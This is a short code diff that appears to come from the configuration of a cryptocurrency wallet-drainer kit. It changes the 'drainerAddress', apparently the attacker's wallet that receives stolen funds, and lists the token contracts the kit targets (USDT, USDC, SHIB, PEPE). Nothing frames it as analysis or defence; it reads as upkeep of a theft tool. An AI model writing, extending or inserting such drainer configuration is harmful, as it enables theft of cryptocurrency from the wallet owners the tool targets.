@@ -53,7 +53,7 @@ const config = {
         ],
         usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
         usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
-        drainerAddress: "0xC9323E1eac2146c5ff34e240d2F13804913B45A6",
+        drainerAddress: "0x9C88B840949Af813E33da3c80b3fa717A54aAE62",
         otherTokenAddresses: {
           SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
           PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
